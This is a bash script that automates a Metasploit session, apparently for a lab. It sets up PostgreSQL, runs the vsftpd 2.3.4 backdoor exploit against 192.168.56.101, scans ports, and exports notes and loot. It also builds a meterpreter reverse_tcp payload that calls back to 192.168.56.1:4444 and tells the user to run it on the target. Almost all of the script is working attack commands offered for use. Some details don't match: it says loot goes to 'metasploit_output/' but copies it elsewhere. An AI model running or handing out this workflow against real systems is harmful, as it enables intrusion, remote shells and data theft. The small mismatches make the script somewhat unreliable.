#!/bin/bash

# metasploit_workflow.sh
# Author: Your Name
# Description: Automates setup and usage of Metasploit with PostgreSQL

echo "[*] Starting Metasploit Workflow..."

### Part 1: Setup Metasploit with PostgreSQL ###
echo "[*] Installing PostgreSQL..."
sudo apt update
sudo apt install -y postgresql

echo "[*] Starting PostgreSQL service..."
sudo systemctl start postgresql
sudo systemctl enable postgresql

echo "[*] Creating PostgreSQL user and database for Metasploit..."
sudo -u postgres createuser msf_user -P
sudo -u postgres createdb --owner=msf_user msf_database

echo "[*] Initializing Metasploit database..."
msfdb init

### Part 2: Basic Usage of Metasploit ###
echo "[*] Starting Metasploit console..."
msfconsole -q -x "
db_status;
search vsftpd;
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS 192.168.56.101;
set RPORT 21;
set PAYLOAD cmd/unix/interact;
run;
notes -t exploit -d 'vsftpd backdoor attempted on 192.168.56.101';
exit
"

### Part 3: Create and Use a Simple Payload ###
echo "[*] Creating payload with msfvenom..."
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf > payload.elf
chmod +x payload.elf
echo "[*] Payload saved to payload.elf"
echo "[*] Note: Transfer payload.elf to target and execute manually."

### Part 4: Explore Auxiliary Modules ###
echo "[*] Running auxiliary TCP port scan..."
msfconsole -q -x "
use auxiliary/scanner/portscan/tcp;
set RHOSTS 192.168.56.101;
set PORTS 20-100;
run;
notes -t scan -d 'TCP scan on 192.168.56.101 ports 20-100';
exit
"

### Part 5: Documentation and Reporting ###
echo "[*] Exporting notes and loot..."
echo "[*] Saving notes to notes.csv"
msfconsole -q -x "notes; exit" > notes.csv

echo "[*] Running loot command to export loot data (if available)..."
msfconsole -q -x "loot -t csv; exit"

echo "[*] Copying loot to metasploit_output/ (if exists)"
LOOT_DIR=~/.msf4/loot
if [ -d "$LOOT_DIR" ]; then
    cp -r $LOOT_DIR/* .
fi

echo "[*] Workflow complete. See 'metasploit_output/' for documentation and loot."
